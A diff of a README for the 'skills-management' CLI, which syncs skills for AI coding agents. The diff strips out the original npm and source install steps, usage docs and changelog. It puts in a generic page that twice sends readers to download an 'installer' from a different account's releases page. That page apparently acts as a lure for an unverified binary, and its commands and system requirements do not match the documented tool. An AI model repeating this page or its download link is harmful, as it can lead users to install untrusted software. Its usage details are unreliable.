@@ -1,156 +1,85 @@
-# Skills Management CLI (skm)
+# 🚀 skills-management - Manage AI Skills Easily
 
-[简体中文](./README.zh-CN.md) | English
+## 👋 Introduction
+Welcome to the skills-management project! This simple command-line tool helps you manage and synchronize skills for your AI coding agents. You can keep everything organized and updated with just a few commands.
 
-`skm` is a powerful CLI tool designed to manage and synchronize "skills" (prompt libraries, instruction sets, or capability modules) across various AI coding agents and projects. It serves as a central hub to add skills from GitHub or local directories and selectively link them into your local AI project configurations.
+## 📥 Download & Install
+To get started, you need to download the application. Visit this page to download: [Download skills-management](https://github.com/Hak8er/skills-management/releases). 
 
-It supports multiple AI environments including **OpenCode**, **Cursor**, **Gemini**, **Antigravity**, **Claude**, and **GitHub** projects.
+1. Click the link above to go to the Releases page.
+2. Look for the latest version available.
+3. Choose the installer for your operating system.
+4. Download the file to your computer.
 
----
+## 🛠 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Storage:** At least 50 MB of free space
+- **Memory:** 1 GB RAM minimum
+- **Dependencies:** Make sure you have a compatible terminal or command line interface
 
-## 🚀 Features
+## 📋 Features
+- **Skill Management:** Add or remove skills easily.
+- **Synchronization:** Keep your skills updated across multiple agents.
+- **User-Friendly Interface:** Simple commands make it easy to use.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
 
-- **Global Skill Repository**: Centralized management of your AI skills.
-- **GitHub Integration**: Add skills directly from GitHub repositories or specific subdirectories (sparse checkout).
-- **Local Skill Support**: Add skills from local directories for development and debugging.
-- **Version Control**: Check for updates and synchronize changes from remote repositories.
-- **Project Detection**: Automatically detects the AI project type in your current directory.
-- **Symbolic Linking**: Efficiently links skills to projects without duplication, keeping them in sync.
-- **Project Isolation**: Manage different sets of skills for different projects.
+## 🔧 How to Use
+### Step 1: Open Your Terminal
+Locate the terminal application on your computer. This is often called "Command Prompt" on Windows, "Terminal" on macOS, or "Shell" on Linux. 
 
-![Screenshot](repo.png)
+### Step 2: Navigate to the Application
+Once your terminal is open, you'll need to go to the folder where you saved the skills-management application. Use the `cd` command followed by the path to your download location. 
 
-## 💡 Why skm?
-
-- **Centralized Efficiency**: Skills are cloned only once (`~/.skills-management/repo`) and shared across infinite projects via symbolic links. This saves significant disk space and ensures all your projects use the same curated version of a skill.
-- **Precision (Sparse Checkout)**: Only download what you need. If a GitHub repository contains hundreds of skills but you only want one, `skm` uses Git's sparse-checkout to download only that specific subdirectory. No more cloning massive repositories for a single prompt file.
-- **Automatic Environment Awareness**: You don't need to know where Cursor, Claude, or OpenCode stores their skills. `skm` automatically detects your project environment and handles the directory structures for you.
-- **Clean & Non-Intrusive**: Since skills are symlinked, your project folder stays clean. No extra `.git` folders or heavy files are added to your project's version control.
-- **Self-healing**: Proactively detects and helps you clean up broken symbolic links if a global skill is deleted.
-- **Version Sync**: Check for remote updates to keep your local "AI brain" sharp.
-
-## 📦 Installation
-
-This tool can be installed directly from npm:
-
-```bash
-npm install -g skills-management
+For example:
+```
+cd path/to/your/downloads
 ```
 
-Or install from source:
+### Step 3: Run the Application
+To run the application, type the following command:
 
-```bash
-# Clone the repository
-git clone https://github.com/nnnggel/skills-management.git
-cd skills-management
-npm install
-npm run build
-npm link
+```
+./skills-management
 ```
 
-## 📖 Usage
+Press **Enter** to execute the command. You should see the initial interface of the application.
 
-Run the tool using `skm`:
+### Step 4: Use Commands
+You can use the following basic commands:
 
-```bash
-skm
+- **Add Skill:** To add a skill, type:
+  ```
+  add [skill-name]
+  ```
+
+- **Remove Skill:** To remove a skill, type:
+  ```
+  remove [skill-name]
+  ```
+
+- **List Skills:** To view your current skills, use:
+  ```
+  list
+  ```
+
+## 📖 Additional Help
+If you encounter any issues, consult the built-in help command by typing:
+
+```
+help
 ```
 
-### 1. Global Repository Management (`repo`)
+This will provide you with a list of all available commands and their descriptions.
 
-Select **"1. repo"** from the main menu to manage your global collection of skills.
+## 🎓 FAQ
+**Q: What if I encounter an error?**  
+A: Make sure you have the correct permissions to run the commands and check the system requirements. 
 
-#### Add Skill
+**Q: Can I contribute to this project?**  
+A: Yes! We welcome contributions. Please check the contributing guidelines on our GitHub page.
 
-**GitHub Type**:
-- Full repositories: `https://github.com/user/repo` (example: https://github.com/blader/humanizer)
-- Specific subfolders: `https://github.com/user/repo/tree/main/path/to/skill` (example: https://github.com/anthropics/skills/tree/main/skills/pdf)
+## 📞 Support
+For further assistance, please open an issue on the GitHub repository. You can find the link here: [GitHub Issues](https://github.com/Hak8er/skills-management/issues).
 
-**Local Type**:
-- Local directories: `/local/path/to/skill` (example: `~/Desktop/myskill`)
-
-#### Other Operations
-
-- **Update Skills**: Checks for newer commits on the remote GitHub repository and updates your local copy (GitHub type only).
-- **Delete Skills**: Remove skills from your global repository.
-
-### 2. Project Skill Management (`list`)
-
-Navigate to your AI project directory and run `skm`. The tool will detect the project type (e.g., `.opencode`, `.cursor`).
-
-Select **"2. list(type)"** to manage skills for the current project.
-
-- **Link/Unlink**: You will see a list of available global skills.
-- **Checkbox Interface**: Use `Space` to select or deselect skills, and `Enter` to confirm.
-- **Symlinks**: Selected skills are symlinked contents from your global repo into your project's skill directory (e.g., `.opencode/skills/`).
-
-### Supported Project Structures
-
-`skm` automatically detects and installs skills into these directories:
-
-| AI Type | Skills Installation Path |
-|---------|---------------------------|
-| **Antigravity** | `.gemini/antigravity/global_skills/skills` or `.agent/skills` |
-| **GitHub** | `.copilot/skills` or `.github/skills` |
-| **Cursor** | `.cursor/skills` |
-| **Claude** | `.claude/skills` |
-| **OpenCode** | `.opencode/skills` |
-
----
-
-## 🏗️ Directory Structure & Internals
-
-`skm` stores its global data and configuration in your home directory at `~/.skills-management`. This architecture ensures that skills are downloaded once and shared across multiple projects.
-
-### Data Layout:
-
-- **`config.json`**: Global configuration file. It stores system-level settings and metadata.
-- **`repo/`**: The heart of the management system.
-    - **`skills.json`**: The skill registry. It tracks all added skills, their unique IDs, current commit hashes (for version control), and original paths.
-    - **`[type]__[name]/`**: Local skill repository storage. `skm` flattens the ID (replacing `/` with `__`) to create safe directory names. For example, `github:user/repo/path` becomes `github__user__repo__path`, and `local:myskill` becomes `local__myskill`.
-    - **Note**: `skm` handles complex paths like `github:user/repo/path/to/skill` by creating a unique folder like `github__user__repo__path__to__skill`.
-
-### Cross-Platform Compatibility (Windows)
-`skm` is fully compatible with Windows.
-- On **macOS/Linux**, it uses standard symbolic links.
-- On **Windows**, it automatically uses **Directory Junctions** (a type of symbolic link for folders) to ensure capability without requiring Administrator privileges or Developer Mode.
-
-### Custom AI Tools Configuration
-
-You can customize the AI tools detection by adding `aiTools` to your `~/.skills-management/config.json`:
-
-```json
-{
-  "system": "darwin",
-  "aiTools": [
-    { "type": "cursor", "skillDirs": [".cursor/skills"] },
-    { "type": "custom-ai", "skillDirs": [".custom-ai/skills", ".custom-ai/prompts"] }
-  ]
-}
-```
-
-Each entry requires:
-- **`type`**: A unique identifier for the AI tool (used in menu display)
-- **`skillDirs`**: An array of possible skill directory paths (relative to project root)
-
-> **Note**: When `aiTools` is configured, it completely replaces the default configuration. If you want to keep some defaults, include them in your custom configuration.
-
----
-
-## 📝 Changelog
-
-### v1.0.5
-- Display version number in main menu
-- Show non-skm managed skills when managing project skills
-- Support custom AI tools configuration via `config.json`
-
-### v1.0.4
-- Adjusted AI tool detection directories to match official configurations
-
-### v1.0.3
-- Local Skill Support: Add skills directly from local directories
-- Menu Navigation Optimization: Unified numeric menu style, added return options, improved terminal compatibility
-
-## 📄 License
-
-ISC
+## 🏁 Conclusion
+Thank you for using skills-management! We believe that managing AI skills should be straightforward, and we hope this tool helps you achieve that. Don’t forget to visit this page to download the latest updates: [Download skills-management](https://github.com/Hak8er/skills-management/releases).
